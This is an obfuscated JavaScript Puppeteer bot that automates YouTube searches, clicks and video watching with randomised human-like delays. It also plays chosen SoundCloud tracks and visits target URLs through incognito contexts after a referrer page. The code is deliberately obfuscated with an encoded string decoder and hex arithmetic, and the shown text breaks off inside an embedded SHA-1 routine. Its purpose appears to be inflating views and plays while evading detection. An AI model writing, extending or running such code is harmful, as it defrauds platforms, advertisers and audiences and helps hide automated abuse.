const Y = d,
  X = c,
  W = b;

function getRandomInt(f, h) {
  const i = ceil(f);
  return floor(random() * (floor(h) - i + (0x134e + -0x5bb * 0x1 + -0x9 * 0x182))) + i;
}
async function createPage(f, h) {
  let i = await f['newPage']();
  return await i['setDefault' + 'Navigation' + 'Timeout'](-0xc * -0x273 + -0x4 * -0x943 + -0x4270), await i['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i;
}
async function standardGoto(f, h, i) {
  return await f['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i ? await wait(-0x4a2 + 0x96a0 + 0x3 * -0x99a + (0x41ed + 0x751b + -0x2 * 0x3e38) * random()) : await standardWaitForNetIdle(f), await wait(-0xb6f + -0x2 * -0xe0f + -0x51 * -0x9 + (-0x9 * -0x67 + 0x3c7d + -0x643 * 0x4) * random()), 0xb33 * -0x1 + -0x1ac6 + 0x25fa * 0x1;
}
async function standardWaitForNetIdle(f) {
  return await wait(0x3e * 0x23 + 0xad0 * 0x2 + -0xa92), await f['waitForNet' + 'workIdle']({
    'idleTime': 0x1d4c,
    'timeout': 0x0
  }), -0x1 * -0xe5 + 0xac4 * 0x2 + 0x59b * -0x4;
}
async function randomWait() {
  return await wait(-0x38 + 0x1 * -0x13e1 + 0x5 * 0x7ed + (0x3 * 0xaac + -0x13 * 0x1cb + 0x1595) * random()), -0x1 * 0x132b + 0x21 * -0x1 + -0x3 * -0x66f;
}
async function watchRandomFrontScreenVideo(f) {
  await f['evaluate'](() => {
    var i;
    (i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('yt-core-im' + 'age--fill-' + 'parent-hei' + 'ght\x20yt-cor' + 'e-image--f' + 'ill-parent' + '-width\x20yt-' + 'core-image' + '\x20yt-core-i' + 'mage--cont' + 'ent-mode-s' + 'cale-aspec' + 't-fill\x20yt-' + 'core-image' + '--loaded'))['slice'](0x1 * 0x443 + 0x20 * -0x6b + 0x91d, 0x115 * 0x21 + -0x5 * -0x453 + 0x394d * -0x1), i[Math['floor'](Math['random']() * i['length'])])['setAttribu' + 'te']('id', '__scope');
  }), await randomWait(), await f['click']('#__scope'), await standardWaitForNetIdle(f);
  const h = await getMaxTime(f);
  return await wait(Math['min']((0xe5 * -0x97 + -0x1 * 0x3859 + -0x1a9cc * -0x1) * getRandomInt(-0x34c * -0x8 + 0x60b + -0x1 * 0x2069, 0x543 * 0x3 + 0x155 * -0x7 + -0x671 * 0x1), h)), -0x17ca + -0x5d * 0x3f + -0x2eae * -0x1;
}
async function getMaxTime(f) {
  return await f['evaluate'](() => {
    const h = {
      'Seconds': 0x3e8,
      'Minutes': 0xea60,
      'Hours': 0x36ee80,
      'Second': 0x3e8,
      'Minute': 0xea60,
      'Hour': 0x36ee80
    };
    let i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('ytp-progre' + 'ss-bar'))['pop']()['ariaValueT' + 'ext'],
      j = 0x1259 * -0x2 + -0x19c9 * -0x1 + 0xae9;
    i = i['split'](i['includes']('of') ? '\x20of\x20' : ',\x20')[0xdd + 0x159 * 0x11 + -0x17c5]['split']('\x20');
    for (let k = -0x25e9 + -0x88b + -0x4 * -0xb9d; k < i['length']; k += 0x89 * 0x11 + -0xe3 * 0x29 + 0x1b44)
      j += i[k] * h[i[k + (0x241 * 0x11 + -0x2509 + -0x3 * 0x6d)]];
    return j;
  });
}
async function anchorAndView(f) {
  log('goto\x20chann' + 'el\x20and\x20vie' + 'w\x20video\x20pr' + 'ocess...'), await standardGoto(f, channels['random']()), await f['click']('tp-yt-pape' + 'r-tab.styl' + 'e-scope:nt' + 'h-child(4)' + '\x20>\x20div:nth' + '-child(1)'), log('clicked\x20vi' + 'deo\x20stuff'), await standardWaitForNetIdle(f), log('page\x20netwo' + 'rk\x20idle\x20x2'), await f['evaluate'](() => {
    const j = Array['from'](document['querySelec' + 'torAll']('#contents'))['filter'](l => 'style-scop' + 'e\x20ytd-rich' + '-grid-row' == l['getAttribu' + 'te']('class'))['slice'](-0x249c + 0xb10 + 0x1992)['map'](l => Array['from'](l['children']))['flat'](0x1 * 0xf35 + -0xb * 0x4a + -0xc06)['map'](l => l['childNodes'][0x1 * -0x527 + 0x748 * 0x1 + -0x220]['childNodes'][0x143a + -0x75d * 0x2 + 0x40 * -0x16]['childNodes'][-0xe45 + -0x14ff + 0x2345 * 0x1]['childNodes'][0x1 * 0x217b + 0x3 * -0x8d1 + -0x708]['childNodes'][-0x1a * 0xd1 + -0x1692 + 0x2bcd]);
    var k;
    return (k = j)[Math['floor'](Math['random']() * k['length'])]['setAttribu' + 'te']('id', '__hookedVi' + 'dToWatch'), j['map'](l => l['href']);
  }), await wait(getRandomInt(0x1ffc + -0x7 * 0x2fb + -0x737, -0xa05 * -0x3 + -0x22b9 + 0x26 * 0xa3)), await f['click']('#__hookedV' + 'idToWatch'), await wait(-0xe16 + -0x4b16 + 0x93c4);
  const h = await getMaxTime(f),
    i = Math['min']((-0xd10a + -0x4c * -0x449 + -0x2 * -0x3adf) * getRandomInt(-0x4 * -0x5f7 + -0x1 * -0x3d + -0x1 * 0x1817, -0x509 * 0x3 + -0x3 * 0x779 + 0x258b), h);
  return await wait(i), 0x4 * 0x3e5 + 0x99 * 0x2b + 0x12 * -0x24b;
}
async function frontScreenActions(f) {
  return log('going\x20to\x20f' + 'ront\x20scree' + 'n\x20and\x20clic' + 'king\x20rando' + 'm\x20video...'), await standardWaitForNetIdle(f), await randomWait(), log('click\x20atte' + 'mpt...'), await f['evaluate'](() => {
    var h;
    (h = Array['from'](document['getElement' + 'sByClassNa' + 'me']('style-scop' + 'e\x20ytd-rich' + '-grid-row'))['filter'](i => 'contents' != i['id']), h[Math['floor'](Math['random']() * h['length'])])['children'][0x1dbd + 0x12b * -0x11 + 0x2 * -0x4f1]['children'][0xf89 + 0xc3b + 0x1bc4 * -0x1]['children'][-0x9a1 + -0x266 + 0xc07]['children'][0x4af * 0x5 + -0x5f6 * -0x1 + -0x6d * 0x45]['children'][-0x1 * -0xa17 + 0x3 * 0x293 + -0x11d0]['setAttribu' + 'te']('id', 'gottemezez');
  }), await randomWait(), await f['click']('#gottemeze' + 'z'), await standardWaitForNetIdle(f), await watchRandomFrontScreenVideo(f), 0x17b1 + -0xa68 + -0xd48;
}
async function searchAndView(f) {
  const T = c,
    S = d;
  log('searching\x20' + 'youtube\x20re' + 'sults'), await randomWait(), await f['evaluate'](() => {
    const R = c;
    let j = Array['from'](document[R(0x11) + 'torAll']('#search'));
    document['getElement' + 'ById']('__searchBo' + 'xReal') || j['find'](k => 'INPUT' === k['tagName'])['setAttribu' + 'te']('id', '__searchBo' + 'xReal');
  }), await f[S(0x1a)]('#__searchB' + 'oxReal', searchTerms['random'](), {
    'delay': -0x185 * -0xd + 0x1 * 0x10da + -0x2437 + (-0x22fa + 0x1 * -0xf92 + 0x362 * 0xf) * random()
  }), await wait(-0x15d4 * -0x1 + 0xf7e + -0x235e + (-0x1457 + -0x23d8 + 0x395b) * random()), await f['click']('#search-ic' + 'on-legacy'), await async function j() {
    if (!await f['evaluate'](() => Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['length']))
      return await j();
  }(), await standardWaitForNetIdle(f);
  let h = await f['evaluate'](() => {
    const k = {
        'seconds': 0x3e8,
        'minutes': 0xea60,
        'hours': 0x36ee80,
        'second': 0x3e8,
        'minute': 0xea60,
        'hour': 0x36ee80
      },
      l = (m = Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['map'](p => p['childNodes'][0xd0f * 0x1 + -0x1 * 0x20a9 + 0x1 * 0x139c]['childNodes'][0x1 * -0xd46 + 0x1 * -0x139f + -0x20e6 * -0x1]['childNodes'][0x2332 + -0x18bd + -0x1 * 0xa74]))[Math['floor'](Math['random']() * m['length'])];
    var m;
    const n = l['childNodes'][0x32 * 0x1d + 0x1a13 * -0x1 + 0x146e]['childNodes'][-0xeb9 + -0xa59 * 0x3 + 0x65 * 0x74]['childNodes'][-0xa92 + -0x66 + -0xafa * -0x1]['ariaLabel'];
    return l['setAttribu' + 'te']('id', '__hookedVi' + 'dToClick'), l['scrollInto' + 'View'](),
      function(p) {
        let q = p['split'](',\x20')['map'](u => u['split']('\x20'))['flat'](-0xe43 + -0xb * -0x20f + -0x27 * 0x37),
          r = -0x1d * 0x25 + 0x20c4 + -0x85 * 0x37;
        for (let u = -0x14c9 + -0x8b7 + -0x1d8 * -0x10; u < q['length']; u += 0xfc9 + -0xf3e + -0x89)
          r += q[u] * k[q[u + (0x29c * -0xa + -0xf31 + 0x294a)]];
        return r;
      }(n);
  });
  await wait((0x1e52 * -0x2 + 0x67f1 + -0x91 * -0x1b) * Math['random']()), await f['click']('#__hookedV' + 'idToClick');
  let i = Math[T(0x10)]((-0x5cba + 0x11536 + 0x31e4) * getRandomInt(0x2204 * 0x1 + 0x500 + -0x2703, 0x12c5 + -0x30 * 0x8 + -0x1 * 0x113b), h + (-0x1 * 0x25d5 + -0x3 * -0xe3 + 0x36b4));
  return await wait(i), 0x1098 + 0x98f + -0x1a26;
}
async function keyWatch(f) {
  log('standard\x20k' + 'eyWatch...'), await standardGoto(f, 'https://ww' + 'w.youtube.' + 'com/watch?' + 'v=' + hookPlaylistPoints['random']() + ('&list=PL7D' + '9Ps0wVt5cy' + 'nwDE_CPYb6' + 'aBUkYyfi-y'), 0x64b * -0x3 + 0x1 * 0x14bc + -0x1db), log('clicking..' + '.'), await f['click']('#button\x20>\x20' + 'ytd-button' + '-renderer\x20' + '>\x20yt-butto' + 'n-shape\x20>\x20' + 'button\x20>\x20y' + 't-touch-fe' + 'edback-sha' + 'pe\x20>\x20div\x20>' + '\x20div.yt-sp' + 'ec-touch-f' + 'eedback-sh' + 'ape__fill'), await f['click']('#top-level' + '-buttons-c' + 'omputed\x20>\x20' + 'ytd-toggle' + '-button-re' + 'nderer\x20>\x20y' + 't-button-s' + 'hape\x20>\x20but' + 'ton\x20>\x20yt-t' + 'ouch-feedb' + 'ack-shape\x20' + '>\x20div\x20>\x20di' + 'v.yt-spec-' + 'touch-feed' + 'back-shape' + '__fill');
  const h = setInterval(async () => {
    log('executed\x20c' + 'leanup\x20int' + 'erval,\x20che' + 'ck\x20process' + '...'), await f['evaluate'](() => {
      setTimeout(() => {
        document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')?.['offsetPare' + 'nt'] && document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')['setAttribu' + 'te']('id', '__lllll');
      }, -0x15ea + 0x263 + -0x1 * -0x1f3f + (0x1bb6 + -0x1dff + 0x631) * Math['random']());
    });
  }, -0x10b * 0x1a + 0x1 * -0x2d67 + 0x5 * 0x13f9);
  await wait(0x5e813 + -0x8aabc + 0x75689);
  try {
    await f['click']('#__lllll');
  } catch (i) {}
  return await wait((-0x2fb + 0x4 * 0x64e5 + -0xa639) * getRandomInt(0x1919 + -0x11d3 * 0x1 + -0x3a1 * 0x2, -0x301 * 0xd + 0x2 * -0x1f3 + -0xbe * -0x3a)), clearInterval(h), 0x24b0 + -0x1df + 0x2 * -0x1168;
}
async function runYTModule(f, h) {
  const i = await createPage(f, 'https://ww' + 'w.youtube.' + 'com/');
  for (await randomWait();;) {
    let j = 0x1 * -0x71 + 0x1 * -0x1e93 + -0x1f04 * -0x1;
    try {
      await standardWaitForNetIdle(i), await GlobalActions['random']()(i);
    } catch (k) {
      i['close']();
    }
    if (j)
      return -0x1802 + 0xbb7 + 0xc4c;
    await randomWait();
  }
  return 0x7b4 + 0x2273 + -0x2a26;
}

function fetchRandomSC() {
  return Math['random']() <= -0xc57 * 0x2 + -0x514 + -0x1 * -0x1dc2 + 0.5 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'long-day-r' + 'emix-prod-' + 'unnecessar' + 'y-beats?si' + '=30458c9ce' + '44c4b4eaab' + '8a3eca1b3a' + '58e&utm_so' + 'urce=clipb' + 'oard&utm_m' + 'edium=text' + '&utm_campa' + 'ign=social' + '_sharing' : Math['random']() < 0x2a6 + 0x1adf + -0x21 * 0xe5 + 0.2 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'whatnot-de' + 'mo?si=cf08' + 'c07128594b' + 'f6b3d049e1' + '680b972f&u' + 'tm_source=' + 'clipboard&' + 'utm_medium' + '=text&utm_' + 'campaign=s' + 'ocial_shar' + 'ing' : 'https://so' + 'undcloud.c' + 'om/22down/' + 'worried-ab' + 'out-the-tr' + 'uth-ft-rik' + 'anbeastly-' + 'nikkkq-cas' + 'ualcheater' + '?si=20d1c3' + '32655b4ef1' + '98a379eac0' + '05725b&utm' + '_source=cl' + 'ipboard&ut' + 'm_medium=t' + 'ext&utm_ca' + 'mpaign=soc' + 'ial_sharin' + 'g';
}

function b(c, d) {
  const e = a();
  return b = function(f, g) {
    f = f - (-0x118d + -0x111b * -0x2 + 0x10a9 * -0x1);
    let h = e[f];
    if (b['chDwnm'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
        for (let r = 0x200 + 0x3 * 0x859 + 0x3dd * -0x7, s, t, u = -0x1880 + 0x4e * 0x65 + -0x646; t = n['charAt'](u++); ~t && (s = r % (-0x15ec + -0x8 * -0x2a1 + 0xe8 * 0x1) ? s * (-0x11 * -0x175 + -0x7f2 + -0x1093) + t : t, r++ % (0x191b + 0x5 * -0xd7 + 0x14e4 * -0x1)) ? p += String['fromCharCode'](-0x1 * 0x1cc5 + -0x23df + -0x9 * -0x74b & s >> (-(-0x1f9 * -0xb + 0xd0 * -0xb + -0x5 * 0x28d) * r & -0x2539 + 0x110 + 0x242f)) : 0x1f49 + 0x1e9e * 0x1 + 0x12b * -0x35) {
          t = o['indexOf'](t);
        }
        for (let v = 0x9ca * 0x3 + 0x1420 + 0xb5 * -0x46, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](0x1060 * 0x2 + 0xbab * -0x1 + -0x1505))['slice'](-(0x1 * -0x13e1 + 0x34 * -0x3b + -0x1fdf * -0x1));
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = -0x7 * -0x10f + 0x7a4 + -0xf0d,
          r, t = '';
        n = i(n);
        let u;
        for (u = -0x21 + 0xf2 * 0x4 + -0x5 * 0xbb; u < 0x1 * 0x443 + 0x20 * -0x6b + 0xa1d; u++) {
          p[u] = u;
        }
        for (u = 0x115 * 0x21 + -0x5 * -0x453 + 0x4c7 * -0xc; u < 0x83 * -0x16 + -0x1 * 0x4b2 + -0x10f4 * -0x1; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (-0x34c * -0x8 + 0x60b + -0x3 * 0xa79), r = p[u], p[u] = p[q], p[q] = r;
        }
        u = 0x543 * 0x3 + 0x155 * -0x7 + -0x676 * 0x1, q = -0x17ca + -0x5d * 0x3f + -0x2ead * -0x1;
        for (let v = 0x1259 * -0x2 + -0x19c9 * -0x1 + 0xae9; v < n['length']; v++) {
          u = (u + (0xdd + 0x159 * 0x11 + -0x17c5)) % (-0x25e9 + -0x88b + -0x2 * -0x17ba), q = (q + p[u]) % (0x89 * 0x11 + -0xe3 * 0x29 + 0x1c42), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (0x241 * 0x11 + -0x2509 + -0x6 * 0xc)]);
        }
        return t;
      };
      b['ukVxHl'] = m, c = arguments, b['chDwnm'] = !![];
    }
    const j = e[-0x249c + 0xb10 + 0x198c],
      k = f + j,
      l = c[k];
    return !l ? (b['OZrYVw'] === undefined && (b['OZrYVw'] = !![]), h = b['ukVxHl'](h, g), c[k] = h) : h = l, h;
  }, b(c, d);
}
async function runGFModule(f, h) {
  async function i() {
    if (doFlags['doSoundClo' + 'ud'] && Math['random']() >= -0xa39 * -0x1 + -0x1943 + 0x6e * 0x23 + 0.3) {
      const j = await f['createInco' + 'gnitoBrows' + 'erContext'](),
        k = await j['newPage']();
      let l = -0x1d * 0x35 + -0xf7 * -0x6 + 0x37;
      if (await k['goto'](fetchRandomSC(), {
          'timeout': NETWORK_PATIENCE
        })['catch'](m => l++), l)
        return await k['close'](), await j['close'](), i();
      try {
        const m = await k['evaluate'](() => {
          let n = document['querySelec' + 'tor']('#content\x20>' + '\x20div\x20>\x20div' + '.l-listen-' + 'hero\x20>\x20div' + '\x20>\x20div.ful' + 'lHero__for' + 'eground.fu' + 'llListenHe' + 'ro__foregr' + 'ound.sc-p-' + '4x\x20>\x20div.f' + 'ullHero__t' + 'itle\x20>\x20div' + '\x20>\x20div\x20>\x20d' + 'iv.soundTi' + 'tle__playB' + 'utton.soun' + 'dTitle__pl' + 'ayButtonHe' + 'ro.theme-l' + 'ight\x20>\x20a');
          n && 'Play' === n['textConten' + 't'] && n['click']();
        });
        await wait(0x15f6f + -0x363 * 0x5 + -0x9eb8 + getRandomInt(0x496 * -0xd + 0xc92 * -0x4 + 0x5b * 0x1da, 0x25f8 + 0x2 * -0x3599 + 0xd6 * 0xdf));
      } catch (n) {}
      return await k['close'](), await j['close'](), i();
    } {
      const {
        url: p,
        preRef: q
      } = scriptTargets['randomFlus' + 'h'](0x10ac + -0x17bf * 0x1 + 0x714 * 0x1), r = await f['createInco' + 'gnitoBrows' + 'erContext'](), s = await r['newPage']();
      let u = -0x71 * 0x15 + -0xfdd + -0x2 * -0xc91;
      if (await s['goto'](q, {
          'timeout': NETWORK_PATIENCE
        })['catch'](w => u++), u)
        return await s['close'](), await r['close'](), i();
      const v = await s['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
      return log(v['slice'](0x7b * 0x4d + 0x13b3 + -0x76 * 0x7b, 0x2a5 * 0xb + 0x2f * -0x1f + -0x1734)), v['includes']('script-des' + 'cription') ? (log('p1'), await s['goto'](p, {
        'timeout': NETWORK_PATIENCE
      })['catch'](w => u++), u ? (await s['close'](), await r['close'](), i()) : (await new Promise(w => setTimeout(w, -0x1 * 0x1079 + -0x1eaa + 0x1 * 0x36f3 + floor((-0x10e + -0x1b + 0x511) * random()))), log('p2'), log(await s['evaluate'](() => {
        const V = c;
        var w, x, y, z, A, B, C, D, E = 'object' == typeof window ? window : {},
          F = !E['JS_SHA1_NO' + '_NODE_JS'] && 'object' == typeof process && process['versions'] && process['versions']['node'];
        F && (E = global), w = ('0123456789' + 'abcdef')['split'](''), x = [
          -(0x982eb6c8 + 0x7d3c6c50 + 0x1cfa67 * -0x528),
          0x1ac0f * -0x5f + 0x687175 + -0x1 * -0xb6681c,
          -0xd9b7 + 0x77fa + 0xe1bd,
          -0x13 * 0x95 + 0x9 * -0x2cc + 0x1 * 0x24bb
        ], y = [
          0x110b + 0x584 + -0x1677,
          0x5b9 + -0x96d + 0x1e2 * 0x2,
          -0x3 * 0x97 + -0x757 * -0x3 + 0x1438 * -0x1,
          0x995 + 0x143 + -0xad8
        ], z = [
          'hex',
          'array',
          'digest',
          'arrayBuffe' + 'r'
        ], A = [], B = function(J) {
          return function(K) {
            return new G(-0x5bd * 0x1 + -0x1 * -0x1321 + 0xd63 * -0x1)['update'](K)[J]();
          };
        }, C = function() {
          var J, K, L = B('hex');
          for (F && (L = D(L)), L['create'] = function() {
              return new G();
            }, L['update'] = function(M) {
              return L['create']()['update'](M);
            }, J = -0x2587 + -0xac9 + 0x1 * 0x3050; J < z['length']; ++J)
            K = z[J], L[K] = B(K);
          return L;
        }, D = function(J) {
          var K = eval('require(\'crypto\');'),
            L = eval('require(\'buffer\')[\'Buffer\'];'),
            M = function(N) {
              if ('string' == typeof N)
                return K['createHash']('sha1')['update'](N, 'utf8')['digest']('hex');
              if (N['constructo' + 'r'] === ArrayBuffer)
                N = new Uint8Array(N);
              else {
                if (void(0x6ec * -0x4 + -0x121f * -0x2 + -0x88e) === N['length'])
                  return J(N);
              }
              return K['createHash']('sha1')['update'](new L(N))['digest']('hex');
            };
          return M;
        };
        class G {
          constructor(J) {
              J ? (A[0x2 * -0x931 + -0x898 + 0x1afa] = A[0xa9c + 0x1 * 0x879 + -0x1305] = A[0x1901 + 0x85c + -0x215c * 0x1] = A[-0x4 * 0x4d3 + -0xa63 * -0x2 + -0x178] = A[-0x2 * 0xc6e + -0x1d2 * 0x1 + 0x1ab1] = A[0x157f + -0x1a7d + -0x1 * -0x502] = A[-0x1 * 0x2665 + 0xb * -0x8c + 0x2c6e] = A[-0x25d0 + -0x18c6 * -0x1 + 0xd10] = A[-0xee3 + 0x10c7 + -0x1dd] = A[0x4b1 * 0x8 + 0xaf * -0x35 + -0x145] = A[-0x39d * 0x4 + -0x535 + 0x13b2] = A[-0x1122 + 0x13cf + -0x2a3] = A[0x11ea * -0x2 + -0x697 + 0x2a76] = A[-0x10d + 0x1e1d * -0x1 + -0xa * -0x31f] = A[-0x89b + 0x1601 + -0xd59] = A[0x1ca * 0x9 + 0x1e34 + -0x2e40] = A[0x4a * -0x59 + -0x36f + 0x1d38] = -0x1275 + 0x1760 + -0x4eb, this['blocks'] = A) : this['blocks'] = [
                -0x253c + 0x32 * -0x6b + 0x3a22,
                -0x1c * 0x156 + 0x1 * -0xe6d + -0x3 * -0x1147,
                0x1ae + -0x1855 + 0x16a7,
                0x1 * 0x18a + -0x74b * -0x2 + -0x1020,
                -0x1d1b + 0x209d + -0x382,
                0x11 * -0xb5 + 0x470 + -0x3 * -0x287,
                -0x503 + 0xaea + -0x5e7,
                0x1f * -0x2 + -0x1105 * -0x1 + 0x10c7 * -0x1,
                0x5ef * 0x3 + -0x79b + -0xa32,
                -0x2083 + -0x324 + 0x1 * 0x23a7,
                -0x47 * 0x3b + -0x3b * 0x95 + 0x37 * 0xec,
                0x1 * 0x407 + 0x31 * 0x6 + -0x52d * 0x1,
                -0x9ec * 0x3 + -0x6d9 * 0x2 + 0x2b76 * 0x1,
                -0x1 * 0x1a75 + -0x1408 + -0x3 * -0xf7f,
                -0x15a9 + -0x7a4 * 0x3 + 0x2c95,
                0xe92 * -0x1 + 0x7b9 + 0x6d9,
                -0xb1 * -0x7 + 0x6ec + -0x1 * 0xbc3
              ], this['h0'] = 0x24741443 * -0x4 + -0x4 * 0x102f6433 + 0x139d304d9 * 0x1, this['h1'] = -0x55365310 + 0x2b6 * 0x2598a0 + 0xdf183cd9, this['h2'] = -0x6983dd * -0xa7 + 0x3 * -0x3b7c046b + 0x832cf28a * 0x2, this['h3'] = -0x14594a21 + 0xc67b506 + 0x1823e991, this['h4'] = 0x15295786 * -0x5 + -0xa88847f4 + 0x15ef3 * 0x156f6, this['block'] = this['start'] = this['bytes'] = this['hBytes'] = -0x2410 + 0x3 * -0x229 + 0x1 * 0x2a8b, this['finalized'] = this['hashed'] = 0x7f * -0x43 + 0x240a + -0x2cd, this['first'] = -0x1854 + -0x1f7f + 0x37d4;
            }
            ['update'](J) {
              const U = b;
              var K, L, M, N, O, P;
              if (!this['finalized']) {
                for ((K = 'string' != typeof J) && J['constructo' + 'r'] === E['ArrayBuffe' + 'r'] && (J = new Uint8Array(J)), M = 0x110 + 0x269b * -0x1 + 0x258b, O = J['length'] || 0x3eb + -0x2f7 + -0xf4, P = this['blocks']; M < O;) {
                  if (this['hashed'] && (this['hashed'] = 0x18 * -0x98 + -0x1c49 + 0x1 * 0x2a89, P[-0x1cf * 0x10 + -0xa12 + 0x2702] = this['block'], P[-0x25a2 + -0x8eb + -0x2e9d * -0x1] = P[0x5bc + 0x26f8 + -0x2cb3] = P[0x3b * -0x94 + -0x3bd * 0x2 + -0x2c * -0xf2] = P[-0x1 * 0x1f7 + -0x1dc4 + 0x1fbe] = P[0x104d + 0x34 + -0x107d] = P[0x31 * -0xaa + -0x1a4 * 0x7 + 0x2c0b] = P[-0x6f7 * 0x1 + -0x3b8 + 0x1 * 0xab5] = P[0xd * 0x1af + 0x31 * -0x3c + -0x14c * 0x8] = P[-0xe * -0x12c + -0x1e4b + 0x1 * 0xdeb] = P[0x4ac + 0x107e * -0x1 + 0xbdb] = P[-0x51b * 0x2 + -0x2027 + 0x1 * 0x2a67] = P[-0x3fb * -0x9 + 0x2405 + -0x47cd] = P[-0x1d5e + -0x2 * 0x4f + -0x782 * -0x4] = P[-0x1 * 0x3c7 + -0x17 * -0x1c + -0x1c * -0xc] = P[-0x1457 * -0x1 + -0x18f5 + -0x2e * -0x1a] = P[0x33e + 0x1 * -0x267d + 0x1 * 0x234e] = -0x5f * 0x3b + -0x7df * -0x2 + 0x627), K) {
                    for (N = this['start']; M < O && N < 0xb * 0x1dd + 0x1afd + -0x2f3c * 0x1; ++M)
                      P[N >> 0x11 * 0xa + 0x2 * -0x353 + 0x5fe] |= J[M] << y[-0x1692 + -0xb * -0x9f + 0xfc0 & N++];
                  } else {
                    for (N = this['start']; M < O && N < 0x558 + 0x133 * 0x19 + -0x2313; ++M)
                      (L = J['charCodeAt'](M)) < -0x2 * 0x535 + -0x47 * -0x83 + -0xf1 * 0x1b ? P[N >> 0x1bee + -0x13 * -0x47 + -0x2131] |= L << y[-0x15f0 + 0x1 * -0xd55 + 0x469 * 0x8 & N++] : L < -0x67 * 0x33 + 0x1de5 + -0x160 ? (P[N >> -0x1241 + 0x16 * -0xc5 + 0x2331] |= (-0xeff * 0x2 + 0x169f + -0xe7 * -0x9 | L >> -0x260c + -0xaa4 + 0x2 * 0x185b) << y[-0x2 * 0x3ee + -0x11be * -0x2 + -0x1b9d & N++], P[N >> 0x79f + 0xdb1 + -0x71a * 0x3] |= (0x256a + 0x36 * -0x2f + 0x6c * -0x40 | -0x1 * -0x230b + -0x2 * 0x1369 + 0x406 & L) << y[0x475 * 0x7 + -0x101 * -0x7 + 0x1 * -0x2637 & N++]) : L < -0xc34 * -0xe + -0x40d * -0x32 + -0x18b * 0x66 || L >= -0x11d65 + 0x15b * -0x3d + 0x9405 * 0x4 ? (P[N >> -0x15b * 0x2 + 0x96 * 0x13 + -0x1 * 0x86a] |= (0xbc * 0x1f + 0x1 * -0xebd + -0x727 | L >> -0x25b9 + -0x1c6 * 0x15 + 0x4b03) << y[-0x2537 * 0x1 + -0xe20 + 0x335a & N++], P[N >> 0x16dc + 0x15d * 0x11 + 0x2e07 * -0x1] |= (-0x1 * -0x80d + 0x194e + -0x20db | L >> -0x1c7 + -0xd02 + 0xecf * 0x1 & -0xb51 * 0x2 + 0xb95 + 0x1e2 * 0x6) << y[0x3 * -0xad9 + -0x2 * -0x371 + 0x19ac & N++], P[N >> -0x7a * -0x14 + -0x29 * -0xa + -0x590 * 0x2] |= (0x2120 + -0x1750 + -0x950 | -0x41 * 0x77 + -0x1 * 0x1ae4 + 0x395a & L) << y[0x2117 * -0x1 + -0xf26 + -0x1 * -0x3040 & N++]) : (L = -0xf09a + -0x13fc7 + 0x1 * 0x33061 + ((-0xf2 * -0x1c + -0x1 * -0x192a + -0x3 * 0xfe1 & L) << -0x21aa + -0xbe0 + 0x2d94 | 0x13 * 0x158 + 0x25c8 + -0x3b51 & J['charCodeAt'](++M)), P[N >> -0x764 + 0x1866 + 0x2 * -0x880] |= (-0x17d4 + -0xa31 + 0x22f5 | L >> 0x1535 * -0x1 + -0x502 * -0x2 + 0xb43) << y[0x2 * 0x1e7 + 0x1255 + -0xb10 * 0x2 & N++], P[N >> 0xda8 + -0x3df * -0x7 + 0x3 * -0xd95] |= (0x1 * 0x19e9 + 0x113 * -0x1e + 0x6d1 | L >> -0x9eb * -0x1 + 0x1e4 * 0x7 + -0x171b & 0x4 * -0x58 + 0x90d * 0x1 + -0x76e) << y[-0x36 * -0xa3 + -0x1 * -0x2033 + -0x2 * 0x2149 & N++], P[N >> -0x2c * 0xa6 + -0x11 * 0x1ed + 0x3d47] |= (-0x1 * -0x20e8 + -0x12f * 0x1a + -0x1a2 | L >> -0x1a * -0xd9 + 0x1e9d + -0x34a1 & 0xf4d + 0x2479 + -0x3 * 0x112d) << y[-0x528 + -0x5 * 0x13d + 0xb5c & N++], P[N >> -0x1810 + -0xb3 * 0x14 + 0x1307 * 0x2] |= (-0x1c3c + 0x17 * 0xf + 0x1b63 | 0x621 + -0x1 * -0x16c3 + 0x1ca5 * -0x1 & L) << y[-0x14f3 + 0x2188 + -0x1 * 0xc92 & N++]);
                  }
                  this['lastByteIn' + 'dex'] = N, this['bytes'] += N - this['start'], N >= -0x1bf3 + -0x4 * 0x994 + 0x4283 ? (this['block'] = P[-0x1 * -0x2441 + 0x27b + 0x672 * -0x6], this['start'] = N - (0x54c + 0x1e0e + -0x231a), this['hash'](), this[U(0x2, '2Of2')] = 0x9dc + -0x10 * 0x43 + -0x5ab) : this['start'] = N;
                }
                return this['bytes'] > -0x24b * -0x921a4 + 0x525970d3 * -0x5 + 0xd79a5b06 * 0x3 && (this['hBytes'] += this['bytes'] / (0x11bc314e * -0xa + -0x1af0bc7 * 0x114 + 0x382129f98) << 0x1 * -0xc13 + -0x60a + 0x1 * 0x121d, this['bytes'] = this['bytes'] % (0x16659c364 + -0xaafb9f44 + 0x2 * 0x2250edf0)), this;
              }
            }
            ['finalize']() {
              if (!this['finalized']) {
                this['finalized'] = -0x769 + 0x15e7 + -0xe7d;
                var J = this['blocks'],
                  K = this['lastByteIn' + 'dex'];
